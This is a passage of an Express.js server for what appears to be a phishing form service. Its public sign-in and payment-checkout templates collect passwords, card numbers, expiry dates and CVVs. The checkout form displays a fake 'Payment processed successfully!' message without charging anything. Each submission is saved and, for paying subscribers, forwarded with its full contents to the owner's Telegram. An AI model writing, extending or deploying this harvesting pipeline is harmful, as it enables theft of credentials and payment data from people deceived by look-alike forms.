      timestamp: new Date().toISOString(),
      data: mappedData,
    });

    console.log(`Attempting to save submission for ${formId} by user ${userId}:`, submission);

    await submission.save();
    console.log(`Submission saved successfully for form ${formId} by user ${userId}`);

    try {
      const subscription = await Subscription.findOne({
        userId,
        status: 'active',
        endDate: { $gt: new Date() },
      });
      if (subscription) {
        const telegram = await Telegram.findOne({ userId });
        if (telegram && telegram.chatId) {
          const notificationMessage = `New submission received for form ${formId}:\n${Object.entries(mappedData)
            .map(([key, value]) => `${key}: ${value}`)
            .join('\n')}`;
          await bot.telegram.sendMessage(telegram.chatId, notificationMessage);
          console.log(`Sent Telegram notification to chatId ${telegram.chatId} for user ${userId}`);
        } else {
          console.log(`No Telegram chatId found for user ${userId}, skipping notification`);
        }
      } else {
        console.log(`User ${userId} is not subscribed, skipping Telegram notification`);
      }
    } catch (telegramError) {
      console.error('Error sending Telegram notification:', telegramError.message);
    }

    res.status(200).json({ message: 'Submission saved successfully' });
  } catch (error) {
    console.error('Error saving submission:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to save submission', details: error.message });
  }
});

app.delete('/form/:id/submission/:index', authenticateToken, async (req, res) => {
  const formId = req.params.id;
  const index = parseInt(req.params.index, 10);
  const userId = req.user.userId;

  try {
    const config = await FormConfig.findOne({ formId, userId });
    if (!config) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
    }
    const adminSettings = await AdminSettings.findOne();
    if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
      return res.status(403).json({ error: 'Form has expired' });
    }

    const userFormSubmissions = await Submission.find({ userId, formId }).sort({ timestamp: 1 });
    if (index < 0 || index >= userFormSubmissions.length) {
      console.error(`Invalid submission index: ${index} for form ${formId} by user ${userId}`);
      return res.status(404).json({ error: 'Submission not found' });
    }

    const submissionToDelete = userFormSubmissions[index];
    await Submission.deleteOne({ _id: submissionToDelete._id });
    console.log(`Deleted submission at index ${index} for form ${formId} by user ${userId}`);

    res.status(200).json({ message: 'Submission deleted successfully' });
  } catch (error) {
    console.error('Error deleting submission:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to delete submission', details: error.message });
  }
});

app.delete('/form/:id', authenticateToken, async (req, res) => {
  const formId = req.params.id;
  const userId = req.user.userId;

  try {
    const config = await FormConfig.findOne({ formId, userId });
    if (!config) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(404).json({ error: 'Form not found or access denied' });
    }

    await FormConfig.deleteOne({ formId });
    await Submission.deleteMany({ formId, userId });
    console.log(`Deleted form ${formId} and its submissions for user ${userId}`);

    res.status(200).json({ message: 'Form and associated submissions deleted successfully' });
  } catch (error) {
    console.error('Error deleting form:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to delete form', details: error.message });
  }
});

app.get('/submissions', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });

    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
        ],
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        ],
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
        ],
      },
    };

    console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);
    res.json({
      submissions,
      templates,
      userId,
    });
  } catch (error) {
    console.error('Error fetching submissions:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
  }
});

app.get('/form/:id', async (req, res) => {
  const formId = req.params.id;
  const config = await FormConfig.findOne({ formId });

  if (!config) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).send('Form not found');
  }

  const adminSettings = await AdminSettings.findOne();
  if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
    return res.status(403).send('Form has expired');
  }

  const templates = {
    'sign-in': {
      name: 'Sign In Form',
      fields: [
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
      ],
      buttonText: 'Sign In',
      buttonAction: 'url',
      buttonUrl: '',
      buttonMessage: '',
    },
    'contact': {
      name: 'Contact Form',
      fields: [
        { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
      ],
      buttonText: 'Submit',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Thank you for contacting us!',
    },
    'payment-checkout': {
      name: 'Payment Checkout Form',
      fields: [
        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
        { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
        { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
      ],
      buttonText: 'Pay Now',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Payment processed successfully!',
    },
  };

  const template = templates[config.template] || templates['sign-in'];
  const fields = template.fields.map(field => {
    const customField = config.placeholders.find(p => p.id === field.id);
    return {
      ...field,
      placeholder: customField ? customField.placeholder : field.placeholder,
    };
  });

  config.placeholders.forEach(p => {
    if (!fields.some(f => f.id === p.id)) {
      fields.push({
        id: p.id,
        placeholder: p.placeholder || template.fields.find(f => f.id === p.id)?.placeholder || 'Enter value',
        type: 'text',
        validation: { required: false },
      });
    }
  });

  const inputCount = fields.length;
  const minHeight = `${300 + (inputCount - template.fields.length) * 40}px`;

  const headerHtml = config.headerText.split('').map((char, i) => {
    if (char === ' ') return '<span class="space"> </span>';
    const color = config.headerColors[i - config.headerText.slice(0, i).split(' ').length + 1] || '';
    return `<span style="color: ${sanitizeForJs(color)}">${sanitizeForJs(char)}</span>`;
  }).join('');

  try {
    res.render('form', {
      templateName: sanitizeForJs(template.name),
      headerHtml,
      subheaderText: sanitizeForJs(config.subheaderText),
      subheaderColor: sanitizeForJs(config.subheaderColor),
      fields,
      borderShadow: sanitizeForJs(config.borderShadow),
      buttonColor: sanitizeForJs(config.buttonColor),
      buttonTextColor: sanitizeForJs(config.buttonTextColor),
      buttonText: sanitizeForJs(config.buttonText),
      buttonAction: sanitizeForJs(config.buttonAction),
      buttonUrl: sanitizeForJs(config.buttonUrl || ''),
      buttonMessage: sanitizeForJs(config.buttonMessage || ''),
      theme: config.theme,
      minHeight,
      template: config.template,
      formId,
      templates: JSON.stringify(templates, (key, value) => {
        if (key === 'regex' && value) return value.toString().slice(1, -1);
        return value;
      }),
    });
  } catch (error) {
    console.error('Error rendering form:', error.message, error.stack);
    res.status(500).send('Error rendering form');
  }
});

app.get('/api/form/:id', authenticateToken, async (req, res) => {
  const formId = req.params.id;
  const userId = req.user.userId;

  try {
    const config = await FormConfig.findOne({ formId, userId });
    if (!config) {
      console.error(`Form not found for ID: ${formId}`);
      return res.status(404).json({ error: 'Form not found' });
    }
    const adminSettings = await AdminSettings.findOne();
    if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
      return res.status(403).json({ error: 'Form has expired' });
    }

    console.log(`Retrieved form config for ${formId} for user ${userId}`);
    res.status(200).json({
      ...config.toObject(),
      formId,
      message: 'Form configuration retrieved successfully',
    });
  } catch (error) {
    console.error('Error fetching form config for /api/form/:id:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch form configuration', details: error.message });
  }
});

const allowedPlans = ['premium-weekly', 'premium-monthly'];
function isValidPlan(planId) {
  return allowedPlans.includes(planId);
}

app.post('/api/subscription/initiate-payment', authenticateToken, async (req, res) => {
  const { planId, email, price } = req.body;
  const userId = req.user.userId;

  console.log(`Received payment initiation request: userId=${userId}, planId=${planId}, email=${email}, price=${price}`);

  try {
    if (!planId || !email || !price) {
      console.error('Validation failed: Missing required fields');
      return res.status(400).json({ error: 'Missing required fields: planId, email, and price are required' });
    }

    if (!isValidPlan(planId)) {
      console.error(`Validation failed: Invalid planId: ${planId}`);
      return res.status(400).json({ error: `Invalid planId. Must be one of: ${allowedPlans.join(', ')}` });
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      console.error('Validation failed: Invalid email format');
      return res.status(400).json({ error: 'Invalid email format' });
    }

    if (!Number.isInteger(price) || price <= 0) {
      console.error('Validation failed: Invalid price');
      return res.status(400).json({ error: 'Price must be a positive integer' });
    }

    const existingSubscription = await hasActiveSubscription(userId);
    if (existingSubscription && existingSubscription.billingPeriod === planId.split('-')[1]) {
      console.warn(`User ${userId} already has an active ${planId.split('-')[1]} subscription`);
      return res.status(400).json({ error: `You already have an active ${planId.split('-')[1]} subscription` });
    }

    console.log('Making Paystack API request to /transaction/initialize');
    const response = await axios.post(
      'https://api.paystack.co/transaction/initialize',
      {
        email,
        amount: price,
        metadata: {
          userId,
          planId,
          billingPeriod: planId === 'premium-weekly' ? 'weekly' : 'monthly',
        },
      },
      {
        headers: {
          Authorization: `Bearer ${PAYSTACK_SECRET_KEY}`,
          'Content-Type': 'application/json',
        },
      }
    );

    console.log('Paystack response:', response.data);

    if (!response.data.status || !response.data.data.authorization_url || !response.data.data.reference) {
      console.error('Paystack response missing required fields:', response.data);
      return res.status(500).json({ error: 'Failed to initialize payment with Paystack' });
    }

    const { authorization_url: authorizationUrl, reference } = response.data.data;

    const subscription = new Subscription({
      userId,
      email,
      planId,
      billingPeriod: planId === 'premium-weekly' ? 'weekly' : 'monthly',
      reference,
      status: 'pending',
      createdAt: new Date().toISOString(),
    });

    console.log('Saving subscription:', subscription);
    await subscription.save();

    res.json({
      message: 'Payment initiated successfully',
      authorizationUrl,
      reference,
    });
  } catch (error) {
    console.error('Error in /api/subscription/initiate-payment:', {
      message: error.message,
      stack: error.stack,
      axiosError: error.response ? {
        status: error.response.status,
        data: error.response.data,
      } : null,
    });
    res.status(500).json({ error: 'Failed to initiate payment' });
  }
});

app.post('/api/subscription/webhook', verifyPaystackWebhook, async (req, res) => {
  console.log('Webhook received:', req.body);

  try {
    const event = req.body;
    if (event.event === 'charge.success') {
      const { reference, metadata, status } = event.data;
      const { userId, planId, billingPeriod } = metadata;

      console.log(`Processing webhook: reference=${reference}, userId=${userId}, planId=${planId}, status=${status}`);

      const subscription = await Subscription.findOne({ reference });
      if (!subscription) {
        console.error(`Webhook error: Subscription not found for reference ${reference}`);
        return res.status(404).json({ error: 'Subscription not found' });
      }

      await Subscription.updateMany(
        { userId, status: 'active', reference: { $ne: reference } },
        { status: 'inactive', endDate: new Date().toISOString() }
      );

      subscription.status = 'active';
      subscription.startDate = new Date().toISOString();
      subscription.endDate = new Date(
        Date.now() + (billingPeriod === 'weekly' ? 7 * 24 * 60 * 60 * 1000 : 30 * 24 * 60 * 60 * 1000)
      ).toISOString();

      console.log('Updating subscription:', subscription);
      await subscription.save();

      res.status(200).json({ message: 'Webhook processed successfully' });
    } else {
      console.log('Webhook ignored: Not a charge.success event');
      res.status(200).json({ message: 'Event ignored' });
    }
  } catch (error) {
    console.error('Webhook error:', error.message);
    res.status(500).json({ error: 'Failed to process webhook' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}).on('error', (error) => {
  console.error('Server startup error:', error.message, error.stack);
  process.exit(1);
});
